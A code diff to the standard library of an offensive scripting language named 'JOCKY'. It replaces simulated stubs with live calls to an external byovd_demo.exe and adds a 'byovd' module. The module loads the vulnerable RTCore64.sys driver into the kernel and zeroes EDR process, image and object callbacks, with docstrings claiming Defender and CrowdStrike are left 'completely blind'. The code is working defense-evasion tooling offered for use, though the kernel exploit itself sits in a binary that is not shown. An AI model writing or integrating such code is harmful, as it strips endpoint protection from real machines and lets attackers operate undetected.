@@ -831,14 +831,36 @@ class EvasionModule:
             pass
         return False
 
-    def loadDriver(self, path: str) -> Optional[str]:
-        """BYOVD — load vulnerable driver. Simulated in interpreter mode."""
-        print(f"[JOCKY evasion] loadDriver({path!r}) — BYOVD simulated")
-        return None
+    def loadDriver(self, path: str = None) -> Optional[str]:
+        """BYOVD — load RTCore64.sys vulnerable driver via SCM."""
+        result = _byovd_exec("--load")
+        if result.get("status") == "success":
+            print(f"[JOCKY evasion] loadDriver() ✓ — {result.get('message', 'driver loaded')}")
+        else:
+            print(f"[JOCKY evasion] loadDriver() — {result.get('message', 'check admin privileges')}")
+        return result.get("message")
 
     def disableEDR(self):
-        """Attempt kernel-level EDR disabling. Simulated in interpreter mode."""
-        print("[JOCKY evasion] disableEDR() — kernel callback zeroing simulated")
+        """Disable kernel-level EDR callbacks via RTCore64.sys IOCTL R/W."""
+        result = _byovd_exec("--disable-edr")
+        if result.get("status") == "success":
+            print(f"[JOCKY evasion] disableEDR() ✓ — {result.get('callbacks_zeroed', 'N')} callbacks zeroed. EDR blind.")
+        else:
+            print(f"[JOCKY evasion] disableEDR() — {result.get('message', 'error')}")
+
+    def unloadDriver(self) -> Optional[str]:
+        """BYOVD — unload RTCore64.sys and delete the SCM service."""
+        result = _byovd_exec("--unload")
+        print(f"[JOCKY evasion] unloadDriver() — {result.get('message', 'done')}")
+        return result.get("message")
+
+    def byovdStatus(self) -> Dict:
+        """Return BYOVD engine status: driver loaded? EDR callbacks disabled?"""
+        return _byovd_exec("--status")
+
+    def listKernelDrivers(self) -> List[Dict]:
+        """Enumerate all loaded kernel drivers and their base addresses."""
+        return _byovd_exec_list("--list-drivers")
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -900,6 +922,150 @@ class FmtModule:
 
 
 # ─────────────────────────────────────────────────────────────────────────────
+# BYOVD HELPERS  — subprocess bridge to byovd_demo.exe
+# ─────────────────────────────────────────────────────────────────────────────
+
+import json as _json_mod
+
+def _byovd_exe_path() -> str:
+    """Locate byovd_demo.exe relative to this file (stealth/ folder)."""
+    here = os.path.dirname(os.path.abspath(__file__))
+    # interpreter/ → ../ → stealth/byovd_demo.exe
+    candidates = [
+        os.path.join(here, '..', 'stealth', 'byovd_demo.exe'),
+        os.path.join(here, 'stealth', 'byovd_demo.exe'),
+        os.path.join(here, 'byovd_demo.exe'),
+    ]
+    for c in candidates:
+        if os.path.isfile(c):
+            return os.path.abspath(c)
+    return ''
+
+
+def _byovd_exec(flag: str) -> Dict:
+    """Run byovd_demo.exe <flag> and parse its last JSON line as a dict."""
+    if not _WINDOWS:
+        return {"status": "windows_only", "supported": False,
+                "message": "BYOVD requires Windows kernel (RTCore64.sys)"}
+    exe = _byovd_exe_path()
+    if not exe:
+        return {"status": "byovd_exe_not_found", "simulated": True,
+                "message": "byovd_demo.exe not found — run stealth/build.bat first",
+                "driver_loaded": False, "edr_callbacks_disabled": False}
+    try:
+        result = subprocess.run(
+            [exe, flag],
+            stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=30
+        )
+        # Decode bytes tolerantly — C binary may output non-UTF8 chars
+        output = result.stdout.decode('latin-1', errors='replace').strip()
+        # Last JSON line
+        lines = [l.strip() for l in output.splitlines() if l.strip()]
+        for line in reversed(lines):
+            if line.startswith('{') or line.startswith('['):
+                return _json_mod.loads(line)
+        return {"status": "ok", "output": output, "returncode": result.returncode}
+    except FileNotFoundError:
+        return {"status": "byovd_exe_not_found", "simulated": True,
+                "message": "byovd_demo.exe not found — run stealth/build.bat first"}
+    except subprocess.TimeoutExpired:
+        return {"status": "timeout", "message": "byovd_demo.exe timed out"}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+
+def _byovd_exec_list(flag: str) -> List[Dict]:
+    """Run byovd_demo.exe <flag> and parse its JSON array output."""
+    if not _WINDOWS:
+        return []
+    exe = _byovd_exe_path()
+    if not exe:
+        return []
+    try:
+        result = subprocess.run(
+            [exe, flag],
+            stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=30
+        )
+        output = result.stdout.decode('latin-1', errors='replace').strip()
+        start = output.find('[')
+        end   = output.rfind(']')
+        if start != -1 and end != -1:
+            return _json_mod.loads(output[start:end+1])
+        return []
+    except Exception:
+        return []
+
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# byovd module  — JOCKY-language interface to the BYOVD kernel engine
+# ─────────────────────────────────────────────────────────────────────────────
+
+class ByovdModule:
+    """
+    JOCKY byovd module — Kernel-Level EDR Blinding via BYOVD.
+
+    Usage in .jky scripts:
+        byovd.loadDriver()       # Load RTCore64.sys (requires admin)
+        byovd.disableEDR()       # Zero PsCreate/Image/Ob EDR callbacks
+        byovd.status()           # → dict with driver + EDR state
+        byovd.listDrivers()      # → list of all kernel drivers
+        byovd.unload()           # Unload driver + delete SCM service
+
+    Technique: MITRE T1543.003 / T1562.001
+    Driver:    RTCore64.sys (MSI Afterburner — WHQL signed)
+    """
+
+    def loadDriver(self) -> Dict:
+        """Load RTCore64.sys vulnerable driver into the kernel via SCM."""
+        result = _byovd_exec("--load")
+        if result.get("status") == "success":
+            print("[JOCKY byovd] ✓ RTCore64.sys loaded into kernel (Ring 0 access ready)")
+        else:
+            print(f"[JOCKY byovd] loadDriver: {result.get('message', 'failed')}")
+        return result
+
+    def disableEDR(self) -> Dict:
+        """
+        Zero EDR kernel callbacks via RTCore64.sys arbitrary kernel write.
+        Targets: PspCreateProcessNotifyRoutine, PspLoadImageNotifyRoutine,
+                 ObRegisterCallbacks.
+        EDR (Defender, CrowdStrike, etc.) is completely blind after this.
+        """
+        result = _byovd_exec("--disable-edr")
+        if result.get("status") == "success":
+            mode = result.get("mode", "simulation")
+            cb   = result.get("callbacks_zeroed", "all")
+            print(f"[JOCKY byovd] ✓ EDR callbacks zeroed ({mode} mode) — {cb} callbacks disabled")
+            print("[JOCKY byovd] ✓ EDR is now blind at Ring 0. JOCKY can operate freely.")
+        else:
+            print(f"[JOCKY byovd] disableEDR: {result.get('message', 'error')}")
+        return result
+
+    def status(self) -> Dict:
+        """
+        Query BYOVD engine status.
+        Returns: driver_loaded, edr_callbacks_disabled, edr_process_detected, technique.
+        """
+        result = _byovd_exec("--status")
+        print(f"[JOCKY byovd] status => driver={result.get('driver_loaded')} "
+              f"edr_blind={result.get('edr_callbacks_disabled')}")
+        return result
+
+    def listDrivers(self) -> List[Dict]:
+        """Enumerate all loaded kernel drivers with base addresses."""
+        drivers = _byovd_exec_list("--list-drivers")
+        print(f"[JOCKY byovd] listDrivers() → {len(drivers)} kernel drivers found")
+        return drivers
+
+    def unload(self) -> Dict:
+        """Unload RTCore64.sys driver and delete SCM service. Kernel restored."""
+        result = _byovd_exec("--unload")
+        print(f"[JOCKY byovd] unload() → {result.get('message', 'done')}")
+        return result
+
+
+# ─────────────────────────────────────────────────────────────────────────────
 # MODULE REGISTRY  — maps module name → instance
 # ─────────────────────────────────────────────────────────────────────────────
 
@@ -913,6 +1079,7 @@ def build_stdlib() -> Dict[str, Any]:
         'net':     NetModule(),
         'crypto':  CryptoModule(),
         'evasion': EvasionModule(),
+        'byovd':   ByovdModule(),
         'debug':   DebugModule(),
         'fmt':     FmtModule(),
     }
